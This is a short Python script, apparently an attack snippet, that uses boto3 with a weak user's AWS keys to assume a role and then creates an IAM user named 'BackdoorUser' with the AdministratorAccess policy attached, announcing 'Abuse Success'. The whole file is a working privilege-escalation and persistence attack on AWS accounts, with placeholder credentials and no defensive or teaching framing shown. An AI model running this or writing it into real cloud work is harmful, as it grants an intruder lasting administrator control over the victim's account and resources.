import boto3

sts = boto3.client('sts', aws_access_key_id='weakuser_key', aws_secret_access_key='weakuser_secret')
response = sts.assume_role(RoleArn='arn:aws:iam::123456789012:role/AssumeMeRole', RoleSessionName='GreyAbuse')
creds = response['Credentials']
iam = boto3.client('iam', aws_access_key_id=creds['AccessKeyId'], aws_secret_access_key=creds['SecretAccessKey'], aws_session_token=creds['SessionToken'])
iam.create_user(UserName='BackdoorUser')
iam.attach_user_policy(UserName='BackdoorUser', PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess')
print("Abuse Success: Backdoor user created.")
